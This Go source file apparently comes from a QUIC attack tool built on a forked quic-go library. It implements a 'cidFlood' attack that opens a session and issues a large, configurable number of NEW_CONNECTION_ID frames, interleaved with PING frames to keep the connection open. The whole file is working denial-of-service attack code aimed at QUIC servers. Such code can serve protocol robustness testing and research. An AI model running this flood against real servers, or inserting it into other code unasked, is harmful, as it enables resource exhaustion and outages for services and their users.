package main

import (
	"log"
	"time"

	"github.com/k4ra5u/quic-go/internal/wire"
)

type cidFlood struct {
	BaseArgs
}

func (cidFlood *cidFlood) Attack() (response *HTTPMessage, err error) {
	session, cancel, err := cidFlood.Make_one_session()
	defer func() {
		_ = session.CloseWithError(0, "")
		cancel()
	}()

	requestStream, err := session.OpenStream()
	if err != nil {
		return nil, err
	}

	ping_frame := &wire.PingFrame{}
	pingFrame := []wire.Frame{
		ping_frame,
	}
	time.Sleep(time.Millisecond * 10)
	connIDgen := session.GetConnIDGenerator()
	highestseq := connIDgen.GetHighestSeq()
	target_frame := highestseq + 1
	sending_frames := cidFlood.repeatTimes
	for j := target_frame; j < target_frame+sending_frames; j++ {
		if j%100 == 0 && j != 0 {
			requestStream.(interface{ SendFramesDirect([]wire.Frame) }).SendFramesDirect(pingFrame)
			time.Sleep(time.Millisecond * 10)
		}
		connIDgen.AddCID(j)
		log.Printf("sent NCI Frame ID:%d\n", j)
		time.Sleep(time.Millisecond * 10)
	}

	time.Sleep(time.Second * 1)
	return nil, nil
}
